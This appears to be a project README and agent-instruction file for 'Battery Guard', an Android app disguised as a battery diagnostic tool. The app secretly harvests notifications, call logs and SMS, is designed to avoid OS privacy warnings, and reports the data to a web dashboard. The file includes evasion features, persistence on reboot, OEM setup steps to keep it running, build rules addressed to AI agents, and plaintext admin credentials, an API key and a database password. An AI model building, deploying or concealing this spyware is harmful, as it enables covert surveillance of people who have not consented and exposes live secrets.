# Battery Guard & DevicePulse Telemetry Platform

## Overview

A robust, stealthy device monitoring and telemetry architecture comprising:
1. **`battery-guard-android`**: Disguised Android utility app (*"Battery Guard"*) that passively captures notifications, call logs, SMS metadata, battery/device health stats, and 5-minute heartbeat pings without generating privacy alerts or OS warnings.
2. **`telemetry-server`**: High-performance Flask web console and REST API deployed in k3s, persisting to PostgreSQL and exposed securely over Cloudflare Tunnel (`https://telemetry.brionet.in`).
3. **`k3s/telemetry-server`**: Production Kubernetes deployment manifests, secrets, PVCs, and automated deployment script (`deploy_telemetry.sh`).

---

## 1. Architecture & Network Flow

```
[Android Phone (Cellular 4G/5G or any Wi-Fi)]
                    │
                    ▼ (Public HTTPS + Base64 Obfuscated Payloads)
       https://telemetry.brionet.in
                    │
                    ▼ (Cloudflare Tunnel: cloudflared)
     [k3s Cluster: telemetry-server pod]
                    │
                    ▼ (Internal Tailscale IP)
  [PostgreSQL: postgresql://postgres:postgres@100.69.32.37:5432/telemetry]
```

- **Client-to-Server:** Public HTTPS via Cloudflare edge. Requires no VPN or custom network configuration on monitored devices.
- **Server-to-Database:** Private connection within Tailscale mesh (`100.69.32.37:5432`).

---

## 2. Telemetry Web Console & Server

- **URL:** [`https://telemetry.brionet.in`](https://telemetry.brionet.in)
- **Dashboard:** [`https://telemetry.brionet.in/dashboard`](https://telemetry.brionet.in/dashboard)
- **Web Credentials:** `admin` / `adminpassword`
- **Ingestion API Key:** `efe9c3beb035fe82111084cbb181e6f9` (Passed via `X-API-Key` header)

### API Endpoints
- `POST /api/v1/ping`: Receives 5-minute device health heartbeat (battery %, temperature, RAM %, storage %, uptime, GPS state, recent app logs).
- `POST /api/v1/sync`: Ingests batches of captured notifications, call logs, and SMS messages (Base64 decoded on receipt before SQL insert).
- `GET /dashboard`: Main overview table with live auto-refresh, device status, and diagnostic log viewer.
- `GET /dashboard/notifications`: Browse and filter captured notifications by app or device.
- `GET /dashboard/calls`: Browse call history (incoming, outgoing, missed, duration).
- `GET /dashboard/sms`: Browse inbound and outbound SMS messages.

### Deployment Commands
To deploy or update the server in k3s:
```bash
/Users/om/Documents/workspaces/cf/k3s/telemetry-server/deploy_telemetry.sh
```

---

## 3. Android Client (`bg-android`)

### Key Components & Features
- **Disguise UI (`MainActivity` / `SetupActivity`):** Clean 4-step "Battery Diagnostic" wizard. Zero server configuration or telemetry references exposed in the UI.
- **5-Minute Heartbeat (`MonitorForegroundService`):** Periodic heartbeat ping updating live battery %, charging state, temperature, RAM %, storage %, and uptime.
- **Dynamic Device Info (`DeviceInfoHelper`):** Queries `Settings.Global.device_name` and `Build.MANUFACTURER` + `Build.MODEL` to automatically register marketing device names (e.g. *Tecno POVA Neo*, *Poco X6*).
- **Passive GPS Detection (`GpsStateReceiver`):** Listens to `PROVIDERS_CHANGED` broadcast to log GPS ON/OFF state without querying coordinates (prevents green status bar dot and background location warnings).
- **Remote Diagnostic Logger (`AppLogger`):** In-memory ring buffer of the last 50 app events attached to heartbeat pings, viewable via the **`📋 View Logs`** button on the web console.
- **Auto-Restart on Reboot (`BootReceiver` + `START_STICKY`):** Restarts the background service and schedules sync workers automatically upon device boot.
- **Local Data Obfuscation (`EncodingUtils`):** Base64 encodes sensitive notification and telephony fields before writing to the local Room database (`monitor.db`).

### Versioning & Build Number Architecture
- **Properties File:** `bg-android/version.properties` is the single source of truth for versioning:
  - `VERSION_CODE`: Build number integer (e.g., `18`).
  - `VERSION_MAJOR`, `VERSION_MINOR`, `VERSION_PATCH`: Semantic version components.
  - `versionName`: Formatted as `${major}.${minor}.${patch}` (e.g., `1.0.17`).
- **Auto-Increment on Build:** `app/build.gradle.kts` (`getVersionProps()`) automatically increments both `VERSION_CODE` (build number) and `VERSION_PATCH` whenever an assemble/build task runs (`assembleDebug`, `bundle`, etc.).
- **Manual Versioning:** For major/minor version increments, update `VERSION_MAJOR` or `VERSION_MINOR` in `bg-android/version.properties`.

### APK Naming & Build Verification Rules (MANDATORY FOR AGENTS)
1. **Dynamic APK Filename:**
   - The output APK is configured in `bg-android/app/build.gradle.kts` via `applicationVariants` (pattern: `bg-${variant.versionName}-b${variant.versionCode}.apk`, e.g., `bg-1.0.18-b19.apk`).
   - **NEVER assume or report `app-debug.apk`** or obsolete `battery-guard-android/...` paths. The generic `app-debug.apk` does NOT exist.
2. **Mandatory Post-Build Verification:**
   - After running `./gradlew assembleDebug`, agents **MUST** dynamically check `bg-android/app/build/outputs/apk/debug/output-metadata.json` or list the directory to resolve the exact APK filename, `versionName`, and `versionCode` (build number).
3. **Accurate ADB Command:**
   - Agents must always report the verified filename and supply the exact ADB install command:
     ```bash
     /Users/om/Library/Android/sdk/platform-tools/adb install -r -d -g /Users/om/Documents/workspaces/cf/bg-android/app/build/outputs/apk/debug/<actual-apk-name>.apk
     ```

### Build & Test Commands
```bash
cd /Users/om/Documents/workspaces/cf/bg-android
./gradlew testDebugUnitTest assembleDebug
```

---

## 4. OEM Configuration Guide (Xiaomi / Poco / Tecno)

To prevent aggressive OEM battery managers from sleeping background services:
1. **Autostart:** Enable **Autostart** in `Settings -> Apps -> Battery Guard -> Autostart`.
2. **Battery Optimization:** Set Battery Saver to **"No restrictions"**.
3. **Notification Access:** Ensure **Battery Guard** is toggled ON under `Settings -> Special app access -> Notification access`.
